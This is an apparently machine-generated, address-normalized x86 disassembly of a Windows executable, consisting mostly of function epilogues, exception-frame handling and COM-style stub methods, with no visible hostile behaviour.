xor edx edx
mov eax [ r-xdata ]
call sub_425ea4
call sub_465388
sub_4655fd
jmp sub_4039a0
sub_465604
pop ebp
retn
sub_465608
sub [ rw-data ] 0x1
retn
sub_465611
add [ esp + 0x4 ] 0xfffffff8
jmp sub_466000
sub_46561b
add [ esp + 0x4 ] 0xfffffff8
jmp sub_466010
sub_465625
add [ esp + 0x4 ] 0xfffffff8
jmp sub_466024
sub_46562f
add [ esp + 0x4 ] 0xfffffff8
jmp sub_466030
sub_465639
add [ esp + 0x4 ] 0xfffffff8
jmp sub_465f70
sub_46564d
add [ esp + 0x4 ] 0xfffffff8
jmp sub_465fec
sub_46570d
add [ esp + 0x4 ] 0xfffffdb4
jmp sub_4689d4
sub_46571a
add [ esp + 0x4 ] 0xfffffdb4
jmp sub_4689e0
sub_465727
add [ esp + 0x4 ] 0xfffffdb4
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
sub_465ea2
jmp sub_4039a0
sub_465f0d
jmp sub_4039a0
sub_465f14
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_465f4c
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403570
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_465fec
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call sub_4680b4
pop ebp
retn 0x4
sub_466000
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
xor eax eax
pop ebp
retn 0x8
sub_466010
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
xor edx edx
mov [ eax ] edx
mov eax 0x80004001
pop ebp
retn 0x10
sub_466024
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x18
j_sub_4036ec#5
jmp sub_4036ec
sub_46660f
jmp sub_4036ec
sub_466644
jmp sub_4039a0
sub_46664b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_466806
jmp sub_4039a0
sub_46680d
mov esp ebp
pop ebp
retn
j_sub_4036ec#4
jmp sub_4036ec
sub_4668f6
jmp sub_4039a0
sub_4668fd
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
j_sub_4036ec#3
jmp sub_4036ec
sub_466a2e
call sub_403a54
pop edi
pop esi
pop ebx
pop ebp
retn
j_sub_403818#2
jmp sub_403818
sub_466bac
push ebx
mov ebx eax
mov eax [ ebx + 0x214 ]
test eax eax
je r-xdata
pop ebx
retn
push eax
call GlobalFree
xor eax eax
mov [ ebx + 0x214 ] eax
sub_466cdc
add esp 0xfffffff0
mov ecx esp
call sub_466d10
mov ax [ esp + 0x8 ]
add esp 0x10
retn
sub_466d92
jmp sub_4039a0
sub_466d99
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_466dee
jmp sub_4039a0
sub_466df5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_4036ec#2
jmp sub_4036ec
sub_467141
jmp sub_4036ec
sub_467146
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x8 ]
call sub_460064
call sub_403a54
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_467164
retn
sub_4672b5
jmp sub_4039a0
sub_4672bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_4036ec
jmp sub_4036ec
sub_4672cb
mov eax [ ebp - 0x4 ]
call sub_466bac
call sub_403a54
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_467388
call sub_4673a8
retn
sub_467390
add esp 0xfffffff0
mov [ esp ] 0x9
mov [ esp + 0x8 ] ecx
mov ecx esp
call sub_467678
add esp 0x10
retn
sub_4673a8
add esp 0xfffffff0
mov [ esp ] 0x3
mov [ esp + 0x8 ] ecx
mov ecx esp
call sub_467678
add esp 0x10
retn
sub_467466
jmp sub_4039a0
sub_46746d
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_467474
add esp 0xfffffff0
mov [ esp ] 0xb
test cx cx
je r-xdata
mov [ esp + 0x8 ] 0x0
mov [ esp + 0x8 ] 0xffff
jmp r-xdata
mov ecx esp
call sub_467678
add esp 0x10
retn
sub_4674a0
call sub_467678
retn
sub_46750d
jmp sub_4036ec
sub_467578
jmp sub_4039a0
sub_46757f
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46764d
jmp sub_4039a0
sub_46766a
jmp sub_4039a0
sub_467671
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46771f
jmp sub_4039a0
sub_467726
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_467780
jmp sub_4039a0
sub_467787
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46782e
jmp sub_4039a0
sub_467835
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_467a17
jmp sub_4036ec
sub_467a1c
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_460064
call sub_403a54
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_467bbc
jmp sub_4039a0
sub_467bc3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467be6
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
retn
mov eax [ ebp - 0x4 ]
call sub_466bac
sub_467bdf
jmp sub_4039a0
j_sub_403818
jmp sub_403818
sub_467d8d
jmp sub_4039a0
sub_467e17
jmp sub_4039a0
sub_467efc
jmp sub_4039a0
sub_467f19
jmp sub_4039a0
sub_467f20
mov esp ebp
pop ebp
retn
sub_46809c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
inc [ eax + 0x20c ]
mov eax [ eax + 0x20c ]
pop ebp
retn 0x4
sub_4680b4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
dec [ eax + 0x20c ]
mov eax [ eax + 0x20c ]
pop ebp
retn 0x4
sub_4680ca
mov eax eax
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_4680d8
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax 0x80004001
pop ebp
retn 0x10
xor edx edx
mov [ eax ] edx
sub_4680f0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax 0x80004002
pop ebp
retn 0x8
xor edx edx
mov [ eax ] edx
sub_468108
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
call sub_466e14
xor eax eax
pop ebp
retn 0x4
sub_46811c
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_4681cc
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x4
sub_46829c
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0xc
sub_4682f6
mov eax eax
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_468444
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x230 ]
call sub_4059cc
lea eax [ ebx + 0x22c ]
call sub_4059cc
xor eax eax
pop ebx
pop ebp
retn 0x4
sub_4684ca
mov eax eax
push ebp
mov ebp esp
mov eax 0x800401a1
pop ebp
retn 0x8
sub_4684fc
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax ebx
call sub_4469f8
mov edx [ ebp + 0xc ]
mov [ edx ] eax
xor eax eax
pop ebx
pop ebp
retn 0x8
sub_4685b8
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_4685c4
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_4685d0
push ebp
mov ebp esp
mov eax 0x1
pop ebp
retn 0xc
sub_468600
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x18
sub_46868d
xchg [ esi ] al
test eax 0x98004686
xchg [ esi ] al
mov eax ebx
mov edx [ esi + 0x70 ]
mov cl 0xfc
call sub_4135f0
jmp sub_46877a
sub_4686a9
lea edx [ ebp - 0x10 ]
mov eax [ esi + 0x8 ]
call sub_465f2c
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_40f510
jmp sub_46877a
sub_4686f1
mov eax ebx
mov edx [ esi + 0x68 ]
mov edx [ edx + 0x18 ]
mov cl 0xfc
call sub_4135f0
jmp sub_46877a
sub_468702
call GetUserDefaultLCID
mov edx eax
mov eax ebx
mov cl 0xfc
call sub_4135f0
jmp sub_46877a
sub_468714
mov eax ebx
mov dl 0x1
call sub_4137c0
jmp sub_46877a
sub_46871f
mov eax ebx
test [ esi + 0x1c ] 0x10
setne dl
xor dl 0x1
call sub_4137c0
jmp sub_46877a
sub_468732
mov eax ebx
test [ esi + 0x1c ] 0x10
setne dl
call sub_4137c0
jmp sub_46877a
sub_468742
mov eax ebx
xor edx edx
call sub_4137c0
jmp sub_46877a
sub_46874d
mov eax ebx
xor edx edx
call sub_4137c0
jmp sub_46877a
sub_468758
mov eax ebx
mov dl 0x1
call sub_4137c0
jmp sub_46877a
sub_468763
mov eax ebx
mov dl 0x1
call sub_4137c0
jmp sub_46877a
sub_46877a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4687a2
lea eax [ ebp - 0x20 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a50
retn
sub_46879b
jmp sub_4039a0
sub_4687a2
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x24
sub_468850
jmp sub_4039a0
sub_4688b3
jmp sub_4039a0
sub_468918
jmp sub_4039a0
sub_468975
jmp sub_4039a0
j_sub_403818#3
jmp sub_403818
sub_4689b4
jmp sub_4039a0
sub_4689bb
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4689c6
mov eax eax
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_4689d4
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x1c
sub_4689e0
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x1c
sub_468a1d
jmp sub_4039a0
sub_468a24
pop ebp
retn
sub_468a70
jmp sub_4039a0
sub_468a77
pop ebp
retn
sub_468aa1
jmp sub_4039a0
sub_468aa8
pop ebp
retn
sub_468aac
sub [ rw-data ] 0x1
retn
sub_468b11
jmp sub_4039a0
sub_468b18
pop ebp
retn
sub_468b1c
sub [ rw-data ] 0x1
retn
sub_468b69
jmp sub_4039a0
sub_468b70
pop ebp
retn
sub_468b74
sub [ rw-data ] 0x1
retn
sub_468e34
add eax 0x4
call sub_468dfc
retn
sub_469000
push ebx
mov ebx eax
mov dx [ ebx + 0x6 ]
mov ax [ ebx + 0x4 ]
call sub_468ab4
movzx eax ax
pop ebx
retn
sub_469144
add esp 0xfffffff8
add eax 0x4
call sub_4697a4
fstp [ esp ]
fwait
fld [ esp ]
pop ecx
pop edx
retn
sub_4692ec
mov [ eax + 0x8 ] dx
retn
sub_4692f4
mov [ eax + 0x10 ] edx
retn
sub_4692f8
mov [ eax + 0xa ] dx
retn
sub_469300
mov [ eax + 0xc ] dx
retn
sub_469308
mov [ eax + 0x6 ] dx
retn
sub_469310
mov [ eax + 0xe ] dx
retn
sub_469318
mov [ eax + 0x4 ] dx
retn
sub_469320
mov [ edx ] 0x0
lea eax [ edx + 0x8 ]
call sub_40d420
retn
sub_469406
jmp sub_4039a0
sub_469433
jmp sub_4039a0
sub_46943a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469457
lea eax [ ebp - 0x2c ]
call sub_403f9c
retn
sub_469450
jmp sub_4039a0
sub_469457
pop ebx
mov esp ebp
pop ebp
retn
sub_46953c
jmp sub_4039a0
sub_469573
jmp sub_4039a0
sub_46957a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4695d0
mov eax [ edx + 0x8 ]
retn
sub_46974d
jmp sub_4039a0
sub_469754
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_469928
jmp sub_4039a0
sub_46992f
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_469969
jmp sub_4039a0
sub_469970
pop ebp
retn
sub_469974
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_414e1c
mov [ rw-data ] eax
sub_469ca0
jmp sub_4039a0
sub_469ca7
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_469cb0
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b938
call sub_4039d8
pop ebx
retn
sub_469cc8
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b938
call sub_4039d8
pop ebx
retn
sub_469d08
add edx 0x4
call sub_469ce0
retn
sub_469d3c
add edx 0x4
call sub_469d14
retn
sub_469da0
push ebx
push esi
mov esi edx
mov ebx eax
lea edx [ esi + 0x4 ]
lea eax [ ebx + 0x4 ]
call sub_46c570
inc eax
pop esi
pop ebx
retn
sub_469e15
jmp sub_4039a0
sub_469e1c
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_469e65
jmp sub_4039a0
sub_469e6c
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_469e74
push ebx
mov ebx eax
mov eax ebx
call sub_469e24
pop ebx
retn
sub_469e80
add esp 0xfffffff8
mov edx esp
add eax 0x4
call sub_46cea0
fild [ esp ]
pop ecx
pop edx
retn
sub_469f1c
jmp sub_4039a0
sub_469f23
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_469f86
jmp sub_4039a0
sub_469f8d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_469f94
movsx edx dx
call sub_469f2c
retn
sub_469fa0
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
add eax 0x4
mov ecx 0x4
mov edx 0x20
call sub_46ce14
pop ebp
retn 0x8
sub_46a0a8
jmp sub_4039a0
sub_46a157
jmp sub_4039a0
sub_46a1bc
mov [ edx ] 0x0
lea eax [ edx + 0x8 ]
call sub_40d420
retn
sub_46a2ac
jmp sub_4039a0
sub_46a2d9
jmp sub_4039a0
sub_46a2e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a2fd
lea eax [ ebp - 0x2c ]
call sub_403f9c
retn
sub_46a2f6
jmp sub_4039a0
sub_46a2fd
pop ebx
mov esp ebp
pop ebp
retn
sub_46a3e7
jmp sub_4039a0
sub_46a41e
jmp sub_4039a0
sub_46a425
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46a4d0
mov eax [ edx + 0x8 ]
retn
sub_46a542
jmp sub_4039a0
sub_46a549
pop ebx
pop ecx
pop ebp
retn
sub_46a598
jmp sub_4039a0
sub_46a59f
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_46a6c6
jmp sub_4039a0
sub_46a6cd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46a7c2
jmp sub_4039a0
sub_46a7c9
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_46a968
jmp sub_4039a0
sub_46a96f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_46ab6f
jmp sub_4039a0
sub_46ab76
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46ad76
jmp sub_4039a0
sub_46ad7d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46af75
jmp sub_4039a0
sub_46af7c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46b2a0
jmp sub_4039a0
sub_46b2a7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46b475
jmp sub_4039a0
sub_46b47c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46b619
jmp sub_4039a0
sub_46b620
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46b893
jmp sub_4039a0
sub_46b89a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46ba29
jmp sub_4039a0
sub_46ba30
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46bb20
jmp sub_4039a0
sub_46bb27
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46bf4d
jmp sub_4039a0
sub_46bf54
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46c75d
jmp sub_4039a0
sub_46c764
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46c7c8
jmp sub_4039a0
sub_46c7cf
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46c90e
jmp sub_4039a0
sub_46c915
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46c984
jmp sub_4039a0
sub_46c98b
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46cc6b
jmp sub_4039a0
sub_46cdc3
jmp sub_4039a0
sub_46cdca
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46ce08
mov al [ eax + 0x1 ]
and al 0x3f
and eax 0xff
retn
sub_46cf69
jmp sub_4039a0
sub_46cf70
pop ebp
retn
sub_46cf74
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_414e1c
mov [ rw-data ] eax
sub_46d265
add eax 0xffffffec
jmp r-xdata
retn
sub_46d26d
add eax 0xffffffec
jmp sub_46d3c8
sub_46d275
add [ esp + 0x4 ] 0xffffffec
jmp sub_405a78
sub_46d27f
add [ esp + 0x4 ] 0xffffffec
jmp sub_405aa0
sub_46d293
add eax 0xffffffe8
jmp r-xdata
mov al [ eax + 0xc ]
retn
sub_46d29b
add eax 0xffffffe8
jmp r-xdata
mov [ eax + 0xc ] dl
retn
sub_46d2a3
add [ esp + 0x4 ] 0xffffffe8
jmp sub_405a78
sub_46d2ad
add [ esp + 0x4 ] 0xffffffe8
jmp sub_405aa0
sub_46d3c8
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x10 ]
mov edx esi
call sub_403ff0
pop esi
pop ebx
retn
sub_46d42c
jmp sub_4039a0
sub_46d433
pop ebp
retn
sub_46d499
jmp sub_4039a0
sub_46d4a0
pop ebp
retn
sub_46d4e8
retn
sub_46d4e9
jmp sub_4039a0
j_sub_46d4e8
jmp sub_46d4e8
sub_46d4f0
pop ebp
retn
sub_46d4f4
sub [ rw-data ] 0x1
retn
sub_46d579
jmp sub_4039a0
sub_46d580
pop ebp
retn
sub_46d584
sub [ rw-data ] 0x1
retn
sub_46d8b2
jmp sub_4039a0
sub_46d8b9
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d8db
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403fc0
retn
j_sub_4039a0#9
jmp sub_4039a0
sub_46d8db
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46d9e2
jmp sub_4039a0
sub_46d9e9
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46da0b
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403fc0
retn
sub_46da04
jmp sub_4039a0
sub_46da0b
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46db9c
jmp sub_4039a0
sub_46dba3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46dbcd
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_403fc0
lea eax [ ebp - 0xc ]
call sub_403f9c
retn
j_sub_4039a0#8
jmp sub_4039a0
sub_46dbcd
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46dc20
mov edx [ rw-data ]
mov edx [ edx ]
xchg edx eax
call sub_45df4c
retn
sub_46dc55
jmp sub_4039a0
sub_46dc5c
pop ebp
retn
sub_46df9f
jmp sub_4039a0
sub_46dfa6
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46e02a
jmp sub_4039a0
sub_46e031
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46e0a3
jmp sub_4039a0
sub_46e0aa
pop ebx
pop ecx
pop ebp
retn
sub_46e114
jmp sub_4039a0
sub_46e11b
pop ebx
pop ecx
pop ebp
retn
sub_46e120
push ebx
mov ebx eax
mov eax [ ebx + 0x318 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov eax [ ebx + 0x2fc ]
mov edx [ eax ]
call [ edx + 0xc4 ]
pop ebx
retn
sub_46e188
jmp sub_4039a0
sub_46e18f
pop ebx
pop ecx
pop ebp
retn
sub_46e1c4
jmp sub_4039a0
sub_46e1cb
pop ebp
retn
sub_46e1d0
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax [ rw-data ]
mov [ eax ] r-xdata
sub_46e1e9
add eax 0xfffffff4
jmp sub_46e348
sub_46e1f1
add eax 0xfffffff4
jmp sub_46e35c
sub_46e1f9
add eax 0xfffffff4
jmp sub_46e3ac
sub_46e201
add [ esp + 0x4 ] 0xfffffff4
jmp sub_405a78
sub_46e20b
add [ esp + 0x4 ] 0xfffffff4
jmp sub_405aa0
sub_46e227
add eax 0xfffffff0
jmp sub_46e36c
sub_46e22f
add [ esp + 0x4 ] 0xfffffff0
jmp sub_405a78
sub_46e239
add [ esp + 0x4 ] 0xfffffff0
jmp sub_405aa0
sub_46e348
push ebx
mov ebx edx
mov edx ebx
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45fa78
pop ebx
retn
sub_46e35c
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45fdb8
retn
sub_46e3ac
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45fac4
retn
sub_46e511
jmp sub_4039a0
sub_46e518
pop ebp
retn
sub_46e51c
sub [ rw-data ] 0x1
retn
sub_46e5d7
add [ esp + 0x4 ] 0xfffffff4
jmp sub_46e954
sub_46e5e1
add [ esp + 0x4 ] 0xfffffff4
jmp sub_46e968
sub_46e609
add [ esp + 0x4 ] 0xfffffff4
jmp sub_46e924
sub_46e874
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0x1
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403570
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_46e944
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
xor eax eax
pop ebp
retn 0x8
sub_46e954
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
xor edx edx
mov [ eax ] edx
mov eax 0x80004001
pop ebp
retn 0x10
sub_46e968
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x18
sub_46eaf3
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_405320
retn
sub_46eb02
jmp sub_4039a0
j_sub_46eaf3
jmp sub_46eaf3
sub_46eb09
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x24
sub_46eb14
xor edx edx
mov [ eax + 0x4 ] edx
test edx edx
je r-xdata
mov al 0x1
retn
xor eax eax
retn
sub_46ebec
retn
sub_46ed3a
jmp sub_4039a0
sub_46ed41
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46ed48
lea ecx [ eax + 0x3c ]
push ecx
mov ecx [ eax + 0x38 ]
test ecx ecx
je r-xdata
mov eax [ eax + 0x30 ]
add eax 0x20
xchg edx eax
call sub_463178
retn
sub ecx 0xfffffff4
sub_46ed64
lea ecx [ eax + 0x3c ]
mov eax [ eax + 0x30 ]
add eax 0x20
xchg edx eax
call sub_463224
retn
sub_46ed74
push ebx
mov ebx eax
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov al [ ebx + 0x48 ]
pop ebx
retn
mov al 0x3
pop ebx
retn
sub_46ed88
mov [ eax + 0x48 ] dl
retn
sub_46ed8c
push ebx
mov ebx eax
mov eax ebx
call sub_46ed74
cmp al 0x4
jne r-xdata
mov al [ ebx + 0x40 ]
pop ebx
retn
xor eax eax
pop ebx
retn
sub_46eda4
mov [ eax + 0x40 ] dl
retn
sub_46edd0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
inc [ eax + 0x34 ]
mov eax [ eax + 0x34 ]
pop ebp
retn 0x4
sub_46ede0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
dec [ eax + 0x34 ]
mov eax [ eax + 0x34 ]
pop ebp
retn 0x4
sub_46ee15
jmp sub_4039a0
sub_46ee1c
pop ebp
retn
sub_46ee20
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419ac0
j_sub_4039a0#6
jmp sub_4039a0
sub_46ee68
pop ebp
retn
sub_46ee6c
sub [ rw-data ] 0x1
retn
sub_47053f
pop ebx
pop ecx
pop ebp
retn
sub_47081c
jmp sub_4039a0
sub_470823
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_4039a0#5
jmp sub_4039a0
sub_470897
pop ebx
pop ecx
pop ebp
retn
sub_47089c
mov edx rw-data
mov [ eax + 0x30 ] edx
retn
j_sub_4039a0#4
jmp sub_4039a0
sub_47090b
pop ebx
pop ecx
pop ebp
retn
j_sub_4039a0#3
jmp sub_4039a0
sub_470da5
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_470dab
add [ edi ] al
xor [ esi ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
mov edx rw-data
mov [ eax + 0x30 ] edx
retn
j_sub_4039a0#2
jmp sub_4039a0
sub_470e2b
pop ebx
pop ecx
pop ebp
retn
j_sub_4039a0
jmp sub_4039a0
sub_4712c5
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_4039a0#7
jmp sub_4039a0
sub_471308
pop ebp
retn
sub_47130c
sub [ rw-data ] 0x1
retn
sub_471896
retn
sub_471897
jmp sub_4039a0
j_sub_471896
jmp sub_471896
sub_47189e
pop ebp
retn
sub_47198d
iretd
sub_4719da
inc edx
add [ eax - 0x4fffbd31 ] bh
iretd
